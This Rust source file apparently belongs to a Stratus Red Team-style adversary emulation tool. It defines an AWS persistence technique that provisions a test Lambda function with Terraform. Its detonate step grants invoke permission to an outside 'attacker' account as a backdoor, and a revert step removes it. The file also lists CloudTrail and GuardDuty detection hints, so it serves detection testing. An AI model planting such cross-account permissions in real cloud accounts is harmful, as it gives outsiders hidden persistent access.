use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
data "archive_file" "lambda_zip" {
  type        = "zip"
  output_path = "${path.module}/dummy.zip"
  source {
    content  = "def handler(event, context): return 'ok'"
    filename = "index.py"
  }
}

resource "aws_iam_role" "lambda_exec" {
  name = "stratus-red-team-lambda-${random_string.suffix.result}"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "lambda.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_lambda_function" "target" {
  function_name    = "stratus-red-team-${random_string.suffix.result}"
  role             = aws_iam_role.lambda_exec.arn
  handler          = "index.handler"
  runtime          = "python3.12"
  filename         = data.archive_file.lambda_zip.output_path
  source_code_hash = data.archive_file.lambda_zip.output_base64sha256
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

output "function_name" {
  value = aws_lambda_function.target.function_name
}

output "function_arn" {
  value = aws_lambda_function.target.arn
}
"#;

const ATTACKER_ACCOUNT_ID: &str = "012345678901";
const STATEMENT_ID: &str = "StratusRedTeamBackdoor";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let function_name = outputs.get("function_name").ok_or_else(|| anyhow::anyhow!("Missing output: function_name"))?;

    aws.lambda
        .add_permission()
        .function_name(function_name)
        .statement_id(STATEMENT_ID)
        .action("lambda:InvokeFunction")
        .principal(ATTACKER_ACCOUNT_ID)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Added cross-account invoke permission for attacker account {} on Lambda function: {}",
        ATTACKER_ACCOUNT_ID, function_name
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let function_name = outputs.get("function_name").ok_or_else(|| anyhow::anyhow!("Missing output: function_name"))?;

    let result = aws.lambda
        .remove_permission()
        .function_name(function_name)
        .statement_id(STATEMENT_ID)
        .send()
        .await;

    match result {
        Err(e) => {
            let msg = format!("{}", e);
            if msg.contains("NoSuchEntity") || msg.contains("NotFound") || msg.contains("not found") {
                // ignore
            } else {
                return Err(anyhow::anyhow!("{}", e));
            }
        }
        Ok(_) => {
            println!("Removed backdoor permission from Lambda function: {}", function_name);
        }
    }

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.persistence.lambda-backdoor-function",
        friendly_name: "Backdoor Lambda Function",
        description: "Grants an external AWS account permission to invoke a Lambda function as a backdoor.",
        detection: "CloudTrail: AddPermission. GuardDuty: Policy:IAMUser/AnomalousBehavior.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
